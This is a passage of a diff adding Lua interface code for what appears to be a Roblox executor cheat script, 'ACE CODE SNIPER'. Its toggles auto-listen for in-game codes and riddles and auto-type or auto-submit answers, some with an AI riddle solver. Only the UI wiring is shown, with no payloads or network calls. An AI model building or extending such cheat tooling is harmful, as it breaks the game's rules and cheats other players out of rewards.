+            frame4.ZIndex = 6
+            frame4.Parent = v89
+            fn46(frame4, 7)
+            createUIStroke2(frame4, tbl25.White, 1, 0.88)
+            local tbl30 = {}
+
+            local function fn51(arg5)
+              local v90 = arg3()
+
+              for k, v91 in pairs(tbl30) do
+                local textColor3 = k == v90
+
+                if arg5 then
+                  local v92 = v77
+                  local create = v92.Create
+                  local tweenInfo = TweenInfo.new(0.14, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+                  local tbl31 = { BackgroundTransparency = textColor3 and 0 or 1 }
+                  textColor3 = textColor3 and tbl25.Window or tbl25.Dim
+                  tbl31.TextColor3 = textColor3
+                  create(v92, v91, tweenInfo, tbl31):Play()
+                else
+                  v91.BackgroundTransparency = textColor3 and 0 or 1
+                  v91.TextColor3 = textColor3 and tbl25.Window or tbl25.Dim
+                end
+              end
+            end
+
+            for i, v90 in ipairs(arg2) do
+              local textButton = Instance.new("TextButton")
+              textButton.Name = "Choice" .. tostring(v90)
+              textButton.Size = UDim2.fromOffset(24, 18)
+              textButton.Position = UDim2.fromOffset(3 + (i - 1) * 25, 3)
+              textButton.BackgroundColor3 = tbl25.Accent
+              textButton.BackgroundTransparency = 1
+              textButton.BorderSizePixel = 0
+              textButton.AutoButtonColor = false
+              textButton.Text = tostring(v90)
+              textButton.TextSize = 11
+              textButton.TextColor3 = tbl25.Dim
+              textButton.Font = Enum.Font.GothamBold
+              textButton.ZIndex = 6
+              textButton.Parent = frame4
+              fn46(textButton, 6)
+              fn47(textButton)
+              tbl30[v90] = textButton
+
+              textButton.MouseButton1Click:Connect(function()
+                arg4(v90)
+                fn51(true)
+              end)
+            end
+
+            fn51(false)
+            return v89
+          end,
+          showSubmitAfter = function(arg)
+            local rowSubmitAfter = tbl28.rowSubmitAfter
+            if not rowSubmitAfter then
+              return
+            end
+            local visible = arg and true or false
+            if rowSubmitAfter.Visible == visible then
+              return
+            end
+            rowSubmitAfter.Visible = visible
+
+            if visible then
+              tbl28.rowsHeight = tbl28.rowsHeight + tbl28.rowH
+            else
+              tbl28.rowsHeight = tbl28.rowsHeight - tbl28.rowH
+            end
+
+            if tbl28.relayout then
+              tbl28.relayout(true)
+            end
+          end,
+        }
+
+        tbl29 = {
+          Dim = Color3.fromRGB(124, 127, 135),
+          Amber = Color3.fromRGB(214, 158, 92),
+          Green = Color3.fromRGB(105, 190, 132),
+          Red = Color3.fromRGB(240, 105, 105),
+          Cyan = Color3.fromRGB(101, 174, 183),
+        }
+
+        fn50 = function()
+          n40 += 1
+          local v89 = n40
+
+          task.defer(function()
+            local preRender = v76.PreRender or v76.RenderStepped
+            local n41 = -1
+            local n42 = 0
+
+            for i = 1, 8 do
+              preRender:Wait()
+              if v89 ~= n40 or not instance then
+                return
+              end
+
+              if fn49 then
+                fn49()
+              end
+
+              pcall(function()
+                instance:ResetScrollVelocity()
+              end)
+
+              local y = instance.AbsoluteCanvasSize.Y
+              local n43 = math.max(0, y - instance.AbsoluteWindowSize.Y)
+              instance.CanvasPosition = Vector2.new(0, n43)
+
+              if math.abs(y - n41) < 0.5 then
+                n42 += 1
+                if n42 >= 2 then
+                  break
+                end
+                continue
+              end
+
+              n42 = 0
+              n41 = y
+            end
+          end)
+        end
+
+        do
+          local instance2 = Instance.new("Frame")
+          instance2.Name = "BrandMark"
+          instance2.Size = UDim2.fromOffset(30, 30)
+          instance2.Position = UDim2.fromOffset(16, 15)
+          instance2.BackgroundColor3 = tbl25.Window
+          instance2.BackgroundTransparency = 1
+          instance2.BorderSizePixel = 0
+          instance2.ClipsDescendants = true
+          instance2.Parent = frame3
+          fn46(instance2, 15)
+          local imageLabel2 = Instance.new("ImageLabel")
+          imageLabel2.Name = "Logo"
+          imageLabel2.Size = UDim2.fromScale(1, 1)
+          imageLabel2.BackgroundTransparency = 1
+          imageLabel2.Image = "rbxassetid://71891923282375"
+          imageLabel2.ScaleType = Enum.ScaleType.Fit
+          imageLabel2.Parent = instance2
+          fn46(imageLabel2, 15)
+        end
+
+        do
+          local white = tbl25.White
+          local gothamBold = Enum.Font.GothamBold
+          createTextLabel(frame3, "Title", "ACE CODE SNIPER", UDim2.fromOffset(155, 25), UDim2.fromOffset(56, 16), 15, white, gothamBold)
+        end
+
+        do
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "MinimizeButton"
+          textButton.Size = UDim2.fromOffset(24, 24)
+          textButton.Position = UDim2.new(1, -94, 0, 18)
+          textButton.BackgroundColor3 = tbl25.Log
+          textButton.BorderSizePixel = 0
+          textButton.Text = ""
+          textButton.AutoButtonColor = false
+          textButton.ZIndex = 6
+          textButton.Parent = frame3
+          fn46(textButton, 7)
+          local v89 = 1
+          createUIStroke2(textButton, Color3.fromRGB(96, 92, 108), v89, 0)
+          fn47(textButton)
+          local frame4 = Instance.new("Frame")
+          frame4.Name = "Horizontal"
+          frame4.AnchorPoint = Vector2.new(0.5, 0.5)
+          frame4.Size = UDim2.fromOffset(10, 2)
+          frame4.Position = UDim2.fromScale(0.5, 0.5)
+          frame4.BackgroundColor3 = tbl25.White
+          frame4.BorderSizePixel = 0
+          frame4.ZIndex = 10
+          frame4.Parent = textButton
+          fn46(frame4, 1)
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "Vertical"
+          frame5.AnchorPoint = Vector2.new(0.5, 0.5)
+          frame5.Size = UDim2.fromOffset(2, 0)
+          frame5.Position = UDim2.fromScale(0.5, 0.5)
+          frame5.BackgroundColor3 = tbl25.White
+          frame5.BorderSizePixel = 0
+          frame5.ZIndex = 5
+          frame5.Parent = textButton
+          fn46(frame5, 1)
+          local minimized = false
+          local flag18 = false
+          local str9 = "MainPage"
+
+          textButton.MouseButton1Click:Connect(function()
+            local aceSniperBarDock = getgenv and getgenv().ACESniperBarDock
+            if type(aceSniperBarDock) == "function" then
+              pcall(aceSniperBarDock, "code")
+              return
+            end
+
+            if flag18 then
+              return
+            end
+            flag18 = true
+            minimized = not minimized
+            v77
+              :Create(
+                frame5,
+                TweenInfo.new(0.32, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+                { Size = minimized and UDim2.fromOffset(2, 10) or UDim2.fromOffset(2, 0) }
+              )
+              :Play()
+            local tabBar = frame2:FindFirstChild("TabBar")
+            local tbl30 = {}
+
+            for _, v90 in ipairs({ "MainPage", "FarmPage", "SettingsPage" }) do
+              local v91 = frame2:FindFirstChild(v90)
+
+              if v91 then
+                table.insert(tbl30, v91)
+              end
+            end
+
+            if minimized then
+              for _, v90 in ipairs(tbl30) do
+                if v90.Visible then
+                  str9 = v90.Name
+                end
+              end
+
+              if tabBar then
+                tabBar.Visible = false
+              end
+
+              for _, v90 in ipairs(tbl30) do
+                v90.Visible = false
+              end
+            end
+
+            tbl28.minimized = minimized
+            local tween = v77:Create(
+              frame2,
+              TweenInfo.new(0.28, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
+              { Size = minimized and UDim2.fromOffset(310, 62) or UDim2.fromOffset(310, tbl28.targetHeight()) }
+            )
+
+            tween.Completed:Connect(function()
+              if not minimized then
+                if tabBar then
+                  tabBar.Visible = true
+                end
+
+                local mainPage = frame2:FindFirstChild(str9) or frame2:FindFirstChild("MainPage")
+
+                if mainPage then
+                  mainPage.Visible = true
+                end
+              end
+
+              flag18 = false
+              return
+            end)
+
+            tween:Play()
+          end)
+        end
+
+        local v89
+
+        do
+          local v90 = codeSniper
+          v89 = v90
+
+          local function fn51(arg, arg2)
+            local flag18 = arg and true or false
+            if v90 == flag18 then
+              return
+            end
+            v90 = flag18
+            v89 = v90
+
+            if not v90 and fn35 then
+              fn35()
+            end
+
+            if arg2 ~= false then
+              tbl18.codeSniper = v90
+              fn31()
+            end
+
+            str8 = nil
+            tbl28.syncAutoType(v90)
+
+            if tbl28.refreshStatus then
+              tbl28.refreshStatus()
+            end
+          end
+
+          local v91 = tbl28.makeSwitch(frame3, v90, function(arg)
+            fn51(arg, true)
+
+            if arg then
+              tbl19.yield()
+            end
+          end, { position = UDim2.new(1, -64, 0, 18), size = UDim2.fromOffset(47, 24), zIndex = 4 })
+
+          table.insert(tbl28.autoTypeSwitches, v91)
+
+          if v78.TouchEnabled then
+            local textButton = Instance.new("TextButton")
+            textButton.Name = "AutoTypeTouchTarget"
+            textButton.Size = UDim2.fromOffset(62, 62)
+            textButton.Position = UDim2.new(1, -70, 0, 1)
+            textButton.BackgroundTransparency = 1
+            textButton.Text = ""
+            textButton.AutoButtonColor = false
+            textButton.ZIndex = 10
+            textButton.Parent = frame3
+            textButton.Activated:Connect(v91.Toggle)
+          end
+
+          tbl19.setTargets = function(arg)
+            local flag18
+
+            if arg ~= nil then
+              flag18 = arg
+            else
+              flag18 = tbl18.codeSniper and true or false
+              arg = tbl18.riddleSolver and true or false
+            end
+
+            tbl19.driving = true
+            v90 = flag18
+            v89 = flag18
+
+            if not flag18 and fn35 then
+              fn35()
+            end
+
+            tbl28.syncAutoType(flag18, true)
+            riddleSolver = arg
+
+            if tbl28.btnRiddles then
+              tbl28.btnRiddles.Force(arg)
+            end
+
+            if tbl28.refreshStatus then
+              tbl28.refreshStatus()
+            end
+
+            tbl19.driving = false
+          end
+        end
+
+        local frame4 = Instance.new("Frame")
+        frame4.Name = "TitleDivider"
+        frame4.Size = UDim2.new(1, -34, 0, 1)
+        frame4.Position = UDim2.fromOffset(17, 54)
+        frame4.BackgroundColor3 = tbl25.White
+        frame4.BackgroundTransparency = 0.72
+        frame4.BorderSizePixel = 0
+        frame4.Parent = frame3
+
+        do
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "StatusBar"
+          frame5.Size = UDim2.fromOffset(276, tbl28.statusH)
+          frame5.Position = UDim2.fromOffset(17, 0)
+          frame5.BackgroundTransparency = 1
+          frame5.BorderSizePixel = 0
+          frame5.ZIndex = 3
+          frame5.Parent = frame2
+          local instance2 = Instance.new("Frame")
+          instance2.Name = "Dot"
+          instance2.Size = UDim2.fromOffset(7, 7)
+          instance2.Position = UDim2.new(0, 1, 0.5, -4)
+          instance2.BackgroundColor3 = tbl25.Dim
+          instance2.BorderSizePixel = 0
+          instance2.ZIndex = 5
+          instance2.Parent = frame5
+          fn46(instance2, 4)
+          local v90 = 8
+          local dim = tbl25.Dim
+          local gothamBlack = Enum.Font.GothamBlack
+          local state = createTextLabel(frame5, "State", "OFF", UDim2.new(1, -14, 1, 0), UDim2.fromOffset(14, 0), v90, dim, gothamBlack)
+          state.ZIndex = 5
+          tbl28.statusBar = frame5
+
+          tbl28.refreshStatus = function()
+            local flag18 = v89 and true or false
+            local white = flag18 and tbl25.White or tbl25.Dim
+            local tweenInfo = TweenInfo.new(0.18, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+            state.Text = flag18 and "READY" or "OFF"
+            v77:Create(instance2, tweenInfo, { BackgroundColor3 = white }):Play()
+            v77:Create(state, tweenInfo, { TextColor3 = white }):Play()
+          end
+        end
+
+        tbl28.refreshStatus()
+
+        do
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "SniperFeed"
+          frame5.Size = UDim2.fromOffset(276, tbl28.notifCollapsedH)
+          frame5.Position = UDim2.fromOffset(17, 0)
+          frame5.BackgroundColor3 = tbl25.Log
+          frame5.BackgroundTransparency = 0.05
+          frame5.BorderSizePixel = 0
+          frame5.ClipsDescendants = true
+          frame5.ZIndex = 3
+          frame5.Parent = frame2
+          fn46(frame5, 10)
+          createUIStroke2(frame5, tbl25.White, 1, 0.86)
+          tbl28.card = frame5
+          local instance2 = Instance.new("TextButton")
+          instance2.Name = "Header"
+          instance2.Size = UDim2.new(1, 0, 0, tbl28.notifHeaderH)
+          instance2.Position = UDim2.fromOffset(0, 10)
+          instance2.BackgroundTransparency = 1
+          instance2.AutoButtonColor = false
+          instance2.Text = ""
+          instance2.ZIndex = 5
+          instance2.Parent = frame5
+          local white = tbl25.White
+          local gothamBlack = Enum.Font.GothamBlack
+          createTextLabel(instance2, "Title", "SNIPER FEED", UDim2.new(1, -46, 1, 0), UDim2.fromOffset(14, 0), 10, white, gothamBlack).ZIndex =
+            6
+          local v90 = 16
+          local dim = tbl25.Dim
+          local gothamBold = Enum.Font.GothamBold
+          local chevron = createTextLabel(
+            instance2,
+            "Chevron",
+            ">",
+            UDim2.fromOffset(20, tbl28.notifHeaderH),
+            UDim2.new(1, -32, 0, 0),
+            v90,
+            dim,
+            gothamBold
+          )
+          chevron.TextXAlignment = Enum.TextXAlignment.Center
+          chevron.ZIndex = 6
+          tbl28.feedChevron = chevron
+          local dim2 = tbl25.Dim
+          local code = Enum.Font.Code
+          local latest = createTextLabel(
+            frame5,
+            "Latest",
+            "nothing yet...",
+            UDim2.new(1, -28, 0, 22),
+            UDim2.fromOffset(14, tbl28.notifHeaderH + 6),
+            11,
+            dim2,
+            code
+          )
+          latest.TextTruncate = Enum.TextTruncate.AtEnd
+          latest.ZIndex = 5
+          tbl28.line = latest
+          local text = tbl25.Text
+          local gothamBold2 = Enum.Font.GothamBold
+          local latestTag = createTextLabel(
+            frame5,
+            "LatestTag",
+            "",
+            UDim2.fromOffset(36, 22),
+            UDim2.new(1, -44, 0, tbl28.notifHeaderH + 6),
+            12,
+            text,
+            gothamBold2
+          )
+          latestTag.TextXAlignment = Enum.TextXAlignment.Right
+          latestTag.Visible = false
+          latestTag.ZIndex = 5
+
+          tbl28.setLine = function(arg, textColor3, arg2)
+            tbl28.notifSeen = true
+            latest.Text = tostring(arg)
+            latest.TextColor3 = textColor3 or tbl25.Dim
+            latest.Size = UDim2.new(1, arg2 and -68 or -28, 0, 22)
+            latestTag.Text = arg2 and tostring(arg2) or ""
+            latestTag.Visible = arg2 ~= nil
+          end
+
+          instance2.MouseButton1Click:Connect(function()
+            tbl28.notifOpen = not tbl28.notifOpen
+            tbl28.relayout(true)
+
+            if tbl28.notifOpen then
+              fn50()
+            end
+          end)
+        end
+
+        instance = Instance.new("ScrollingFrame")
+        instance.Name = "Console"
+        instance.Size = UDim2.new(1, -24, 0, 0)
+        instance.Position = UDim2.fromOffset(14, 40)
+        instance.Visible = false
+        instance.BackgroundTransparency = 1
+        instance.BorderSizePixel = 0
+        instance.ClipsDescendants = true
+        instance.Active = true
+        instance.ScrollingEnabled = true
+        instance.ScrollingDirection = Enum.ScrollingDirection.Y
+        instance.ElasticBehavior = Enum.ElasticBehavior.Never
+        instance.VerticalScrollBarInset = Enum.ScrollBarInset.ScrollBar
+        instance.CanvasSize = UDim2.new(0, 0, 0, 0)
+        instance.AutomaticCanvasSize = Enum.AutomaticSize.Y
+        instance.ScrollBarThickness = 6
+        instance.ScrollBarImageColor3 = tbl25.Dim
+        instance.ZIndex = 4
+        instance.Parent = tbl28.card
+        local uiPadding = Instance.new("UIPadding")
+        uiPadding.PaddingTop = UDim.new(0, 4)
+        uiPadding.PaddingBottom = UDim.new(0, 14)
+        uiPadding.PaddingLeft = UDim.new(0, 0)
+        uiPadding.PaddingRight = UDim.new(0, 6)
+        uiPadding.Parent = instance
+        local instance2 = Instance.new("UIListLayout")
+        instance2.FillDirection = Enum.FillDirection.Vertical
+        instance2.HorizontalAlignment = Enum.HorizontalAlignment.Left
+        instance2.SortOrder = Enum.SortOrder.LayoutOrder
+        instance2.Parent = instance
+        instance2.Padding = UDim.new(0, 9)
+        local fn51
+
+        fn51 = function(arg, textColor3, arg2, arg3)
+          if not instance then
+            return
+          end
+
+          if textLabel then
+            textLabel:Destroy()
+            textLabel = nil
+          end
+
+          v88 += 1
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "Entry"
+          frame5.Size = UDim2.new(1, 0, 0, 0)
+          frame5.AutomaticSize = Enum.AutomaticSize.Y
+          frame5.BackgroundTransparency = 1
+          frame5.LayoutOrder = v88
+          frame5.ZIndex = 5
+          local n41 = 0
+
+          if arg3 then
+            local textLabel2 = Instance.new("TextLabel")
+            textLabel2.Name = "Prefix"
+            textLabel2.Size = UDim2.fromOffset(34, 15)
+            textLabel2.Position = UDim2.fromOffset(0, 0)
+            textLabel2.BackgroundTransparency = 1
+            textLabel2.Text = tostring(arg3)
+            textLabel2.TextColor3 = tbl29.Dim
+            textLabel2.TextSize = 11
+            textLabel2.Font = Enum.Font.GothamBold
+            textLabel2.TextXAlignment = Enum.TextXAlignment.Left
+            textLabel2.TextYAlignment = Enum.TextYAlignment.Top
+            textLabel2.ZIndex = 10
+            textLabel2.Parent = frame5
+            n41 = 40
+          end
+
+          local textLabel2 = Instance.new("TextLabel")
+          textLabel2.Name = "Body"
+          textLabel2.Size = UDim2.new(1, -(n41 + (arg2 and 40 or 0)), 0, 0)
+          textLabel2.Position = UDim2.fromOffset(n41, 0)
+          textLabel2.AutomaticSize = Enum.AutomaticSize.Y
+          textLabel2.BackgroundTransparency = 1
+          textLabel2.Text = tostring(arg)
+          textLabel2.TextColor3 = textColor3 or tbl29.Dim
+          textLabel2.TextSize = 12
+          textLabel2.Font = Enum.Font.Code
+          textLabel2.TextXAlignment = Enum.TextXAlignment.Left
+          textLabel2.TextYAlignment = Enum.TextYAlignment.Top
+          textLabel2.TextWrapped = true
+          textLabel2.LineHeight = 1.12
+          textLabel2.ZIndex = 10
+          textLabel2.Parent = frame5
+
+          if arg2 then
+            local textLabel3 = Instance.new("TextLabel")
+            textLabel3.Name = "Tag"
+            textLabel3.Size = UDim2.fromOffset(36, 15)
+            textLabel3.Position = UDim2.new(1, -36, 0, 0)
+            textLabel3.BackgroundTransparency = 1
+            textLabel3.Text = tostring(arg2)
+            textLabel3.TextColor3 = tbl25.Text
+            textLabel3.TextSize = 12
+            textLabel3.Font = Enum.Font.GothamBold
+            textLabel3.TextXAlignment = Enum.TextXAlignment.Right
+            textLabel3.TextYAlignment = Enum.TextYAlignment.Top
+            textLabel3.ZIndex = 5
+            textLabel3.Parent = frame5
+          end
+
+          frame5.Parent = instance
+          tbl27[#tbl27 + 1] = frame5
+
+          while #tbl27 > 40 do
+            local v90 = table.remove(tbl27, 1)
+
+            if v90 then
+              v90:Destroy()
+            end
+          end
+        end
+
+        textLabel = Instance.new("TextLabel")
+        textLabel.Name = "Placeholder"
+        textLabel.Size = UDim2.new(1, 0, 0, 0)
+        textLabel.AutomaticSize = Enum.AutomaticSize.Y
+        textLabel.LayoutOrder = 0
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = "nothing yet..."
+        textLabel.TextColor3 = tbl29.Dim
+        textLabel.TextSize = 12
+        textLabel.Font = Enum.Font.Code
+        textLabel.TextXAlignment = Enum.TextXAlignment.Left
+        textLabel.TextYAlignment = Enum.TextYAlignment.Top
+        textLabel.ZIndex = 5
+        textLabel.Parent = instance
+
+        fn49 = function() end
+
+        do
+          local frame5 = Instance.new("Frame")
+          frame5.Name = "SettingsSection"
+          frame5.Size = UDim2.fromOffset(276, tbl28.sectionHeaderH)
+          frame5.Position = UDim2.fromOffset(16, tbl28.notifCollapsedH + tbl28.gap)
+          frame5.BackgroundColor3 = tbl25.Log
+          frame5.BackgroundTransparency = 0.05
+          frame5.BorderSizePixel = 0
+          frame5.ClipsDescendants = true
+          frame5.ZIndex = 3
+          frame5.Parent = frame2
+          fn46(frame5, 9)
+          createUIStroke2(frame5, tbl25.White, 1, 0.86)
+          tbl28.section = frame5
+          local textButton = Instance.new("TextButton")
+          textButton.Name = "Header"
+          textButton.Size = UDim2.new(1, 0, 0, tbl28.sectionHeaderH)
+          textButton.BackgroundTransparency = 1
+          textButton.AutoButtonColor = false
+          textButton.Text = ""
+          textButton.ZIndex = 5
+          textButton.Parent = frame5
+          local v90 = 8
+          local white = tbl25.White
+          local gothamBlack = Enum.Font.GothamBlack
+          createTextLabel(textButton, "Title", "SETTINGS", UDim2.new(1, -46, 1, 0), UDim2.fromOffset(14, 0), v90, white, gothamBlack).ZIndex =
+            6
+          local dim = tbl25.Dim
+          local gothamBold = Enum.Font.GothamBold
+          local chevron = createTextLabel(
+            textButton,
+            "Chevron",
+            ">",
+            UDim2.fromOffset(20, tbl28.sectionHeaderH),
+            UDim2.new(1, -40, 0, 0),
+            12,
+            dim,
+            gothamBold
+          )
+          chevron.TextXAlignment = Enum.TextXAlignment.Center
+          chevron.ZIndex = 6
+          tbl28.chevron = chevron
+          local instance3 = Instance.new("ScrollingFrame")
+          instance3.Name = "Rows"
+          instance3.Size = UDim2.new(1, 0, 0, 0)
+          instance3.Position = UDim2.fromOffset(0, tbl28.sectionHeaderH + 2)
+          instance3.BackgroundTransparency = 1
+          instance3.BorderSizePixel = 0
+          instance3.Active = true
+          instance3.ScrollingDirection = Enum.ScrollingDirection.Y
+          instance3.ElasticBehavior = Enum.ElasticBehavior.Never
+          instance3.CanvasSize = UDim2.new(0, 0, 0, 0)
+          instance3.AutomaticCanvasSize = Enum.AutomaticSize.Y
+          instance3.ScrollBarThickness = 3
+          instance3.ScrollBarImageColor3 = tbl25.Dim
+          instance3.ZIndex = 4
+          instance3.Parent = frame5
+          tbl28.rows = instance3
+          local uiListLayout = Instance.new("UIListLayout")
+          uiListLayout.FillDirection = Enum.FillDirection.Vertical
+          uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
+          uiListLayout.Parent = instance3
+          local uiPadding2 = Instance.new("UIPadding")
+          uiPadding2.PaddingBottom = UDim.new(0, 6)
+          uiPadding2.Parent = instance3
+          tbl28.makeGroupRow("CODES")
+
+          tbl28.btnListen = tbl28.makeRow("AUTO CODE/RIDDLE LISTEN", tbl19.enabled, function(arg)
+            tbl19.setEnabled(arg)
+          end)
+
+          tbl28.btnRetypeInvalid = tbl28.makeRow("RETYPE INVALID", retypeInvalid, function(retypeInvalid2)
+            retypeInvalid = retypeInvalid2
+            tbl18.retypeInvalid = retypeInvalid2
+
+            if retypeInvalid2 and backupRiddle then
+              backupRiddle = false
+              tbl18.backupRiddle = false
+
+              if tbl28.btnBackupRiddle then
+                tbl28.btnBackupRiddle.Force(false)
+              end
+            end
+
+            if not retypeInvalid2 and fn34 then
+              fn34()
+            end
+
+            fn31()
+          end)
+
+          tbl28.makeRow("AUTO SUBMIT", autoSubmit, function(autoSubmit2)
+            autoSubmit = autoSubmit2
+            tbl18.autoSubmit = autoSubmit2
+            fn31()
+            tbl28.showSubmitAfter(autoSubmit2)
+          end)
+
+          tbl28.rowSubmitAfter = tbl28.makeChoiceRow("SUBMIT AFTER", { 1, 2, 3, 6 }, function()
+            return submitAfter
+          end, function(submitAfter2)
+            submitAfter = submitAfter2
+            tbl18.submitAfter = submitAfter2
+            fn35()
+            fn31()
+          end)
+
+          tbl28.showSubmitAfter(autoSubmit)
+          tbl28.makeGroupRow("RIDDLES")
+
+          tbl28.btnRiddles = tbl28.makeRow("AI RIDDLES", riddleSolver, function(riddleSolver2)
+            riddleSolver = riddleSolver2
+            tbl18.riddleSolver = riddleSolver2
+            fn31()
+
+            if riddleSolver2 then
+              if not fn36() then
+                local red = tbl25.Red
+                fn32("AI riddles need an HTTP function - " .. fn37() .. " exposes none", red)
+              end
+
+              tbl19.yield()
+            else
+              n36 += 1
+            end
+          end)
+
+          tbl28.btnAiSubmit = tbl28.makeRow("AI RIDDLES AUTO SUBMIT", aiAutoSubmit, function(aiAutoSubmit2)
+            aiAutoSubmit = aiAutoSubmit2
+            tbl18.aiAutoSubmit = aiAutoSubmit2
+
+            if not aiAutoSubmit2 and backupRiddle then
+              backupRiddle = false
+              tbl18.backupRiddle = false
+
+              if tbl28.btnBackupRiddle then
+                tbl28.btnBackupRiddle.Force(false)
+              end
+            end
+
+            fn31()
+          end)
+
+          tbl28.btnBackupRiddle = tbl28.makeRow("BACKUP RIDDLE ANSWER", backupRiddle, function(backupRiddle2)
+            backupRiddle = backupRiddle2
+            tbl18.backupRiddle = backupRiddle2
+
+            if backupRiddle2 and not aiAutoSubmit then
+              aiAutoSubmit = true
+              tbl18.aiAutoSubmit = true
+
+              if tbl28.btnAiSubmit then
+                tbl28.btnAiSubmit.Force(true)
+              end
+            end
+
+            if backupRiddle2 and retypeInvalid then
+              retypeInvalid = false
+              tbl18.retypeInvalid = false
+
+              if tbl28.btnRetypeInvalid then
+                tbl28.btnRetypeInvalid.Force(false)
+              end
+
+              if fn34 then
+                fn34()
+              end
+            end
+
+            fn31()
+          end)
+
+          tbl19.refreshRow = function()
+            if tbl28.btnListen then
+              tbl28.btnListen.Set(tbl19.enabled, true)
+            end
+          end
+
+          textButton.MouseButton1Click:Connect(function()
+            tbl28.settingsOpen = not tbl28.settingsOpen
+            tbl28.relayout(true)
+          end)
+        end
+
+        tbl28.targetHeight = function()
+          if tbl28.activeTab == "MAIN" then
+            return tbl28.windowHeight
+          end
+          return tbl28.tabHeights[tbl28.activeTab] or tbl28.tabHeights.MAIN
+        end
+
+        tbl28.applyWindowHeight = function(arg)
+          if tbl28.minimized then
+            return
+          end
+          local v90 = tbl28.targetHeight()
+          frame2:SetAttribute("ACEWindowHeight", v90)
+          fn48()
+          if not arg then
+            frame2.Size = UDim2.fromOffset(310, v90)
+            return
+          end
+          v77
+            :Create(frame2, TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { Size = UDim2.fromOffset(310, v90) })
+            :Play()
+        end
+
+        tbl28.setActiveTab = function(activeTab)
+          tbl28.activeTab = activeTab
+          tbl28.applyWindowHeight(true)
+        end
+
+        tbl28.relayout = function(arg)
+          local n41 = tbl28.clearRow and tbl28.clearRowH + tbl28.gap or 0
+          local n42 = tbl28.notifCollapsedH + (tbl28.notifOpen and tbl28.consoleWant or 0)
+          local n43 = tbl28.sectionHeaderH + (tbl28.settingsOpen and 2 + tbl28.rowsHeight + 6 or 0)
+          local n44 = n42 + tbl28.gap + n43 - tbl28.maxContent - n41
+
+          if n44 > 0 then
+            if tbl28.notifOpen then
+              local n45 = math.min(n44, tbl28.consoleWant - tbl28.consoleMin)
+              n42 -= n45
+              n44 -= n45
+            end
+
+            if n44 > 0 and tbl28.settingsOpen then
+              n43 = math.max(tbl28.sectionHeaderH + 2 + tbl28.rowsMin, n43 - n44)
+            end
+          end
+
+          local n45 = tbl28.statusH + tbl28.statusGap
+          local n46 = n45 + n41
+          local n47 = n46 + n42 + tbl28.gap
+          local n48 = n47 + n43
+          tbl28.windowHeight = tbl28.chromeH + n48 + tbl28.footerBand
+          local tweenInfo = TweenInfo.new(0.22, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
+
+          local function fn52(arg2, arg3)
+            if not arg then
+              for k, v90 in pairs(arg3) do
+                arg2[k] = v90
+              end
+
+              return
+            end
+
+            v77:Create(arg2, tweenInfo, arg3):Play()
+          end
+
+          if tbl28.clearRow then
+            fn52(tbl28.clearRow, { Position = UDim2.fromOffset(17, n45) })
+          end
+
+          fn52(tbl28.card, { Position = UDim2.fromOffset(17, n46), Size = UDim2.fromOffset(276, n42) })
+          fn52(tbl28.section, { Position = UDim2.fromOffset(17, n47), Size = UDim2.fromOffset(276, n43) })
+          fn52(tbl28.chevron, { Rotation = tbl28.settingsOpen and 90 or 0 })
+          fn52(tbl28.feedChevron, { Rotation = tbl28.notifOpen and 90 or 0 })
+
+          if tbl28.footer then
+            fn52(tbl28.footer, { Position = UDim2.new(0.5, -70, 0, n48 + 8) })
+          end
+
+          tbl28.line.Visible = not tbl28.notifOpen
+          instance.Visible = tbl28.notifOpen
+          instance.Size = UDim2.new(1, -32, 0, math.max(0, n42 - tbl28.notifHeaderH - 16))
+          tbl28.rows.Visible = tbl28.settingsOpen
+          tbl28.rows.Size = UDim2.new(1, 0, 0, tbl28.settingsOpen and n43 - tbl28.sectionHeaderH - 2 or 0)
+          tbl28.applyWindowHeight(arg)
+        end
+
+        uiScale:GetPropertyChangedSignal("Scale"):Connect(function()
+          fn50()
+        end)
+
+        local instance3, frame5
+
+        do
+          local white = tbl25.White
+          local gothamBold = Enum.Font.GothamBold
+          local discordFooter = createTextLabel(
+            frame2,
+            "DiscordFooter",
+            "discord.gg/aceduels",
+            UDim2.fromOffset(140, 19),
+            UDim2.new(0.5, -70, 0, 392),
+            10,
+            white,
+            gothamBold
+          )
+          discordFooter.TextXAlignment = Enum.TextXAlignment.Center
+          discordFooter.BackgroundColor3 = tbl25.Window
+          discordFooter.BackgroundTransparency = 1
+          discordFooter.TextStrokeColor3 = tbl25.Window
+          discordFooter.TextStrokeTransparency = 0.35
+          discordFooter.ZIndex = 3
+          local frame6 = Instance.new("Frame")
+          frame6.Name = "TabBar"
+          frame6.Size = UDim2.new(1, 0, 0, 34)
+          frame6.Position = UDim2.fromOffset(0, 60)
+          frame6.BackgroundTransparency = 1
+          frame6.BorderSizePixel = 0
+          frame6.ZIndex = 6
+          frame6.Parent = frame2
+          local instance4 = Instance.new("Frame")
+          instance4.Name = "MainPage"
+          instance4.Size = UDim2.new(1, 0, 1, -98)
+          instance4.Position = UDim2.fromOffset(0, 98)
+          instance4.BackgroundTransparency = 1
+          instance4.ZIndex = 2
+          instance4.Parent = frame2
+          instance3 = Instance.new("Frame")
+          instance3.Name = "FarmPage"
+          instance3.Size = instance4.Size
+          instance3.Position = instance4.Position
+          instance3.BackgroundTransparency = 1
+          instance3.Visible = false
+          instance3.ZIndex = 2
+          instance3.Parent = frame2
+          frame5 = Instance.new("Frame")
+          frame5.Name = "SettingsPage"
+          frame5.Size = instance4.Size
+          frame5.Position = instance4.Position
+          frame5.BackgroundTransparency = 1
+          frame5.Visible = false
+          frame5.ZIndex = 2
+          frame5.Parent = frame2
+          tbl28.statusBar.Parent = instance4
+          tbl28.card.Parent = instance4
+          tbl28.section.Parent = instance4
+          discordFooter.Parent = instance4
+          tbl28.footer = discordFooter
+          tbl28.relayout(false)
+          local instance5 = Instance.new("Frame")
+          instance5.Name = "TabGroup"
+          instance5.Size = UDim2.new(1, -34, 0, 22)
+          instance5.Position = UDim2.new(0, 17, 0.5, -11)
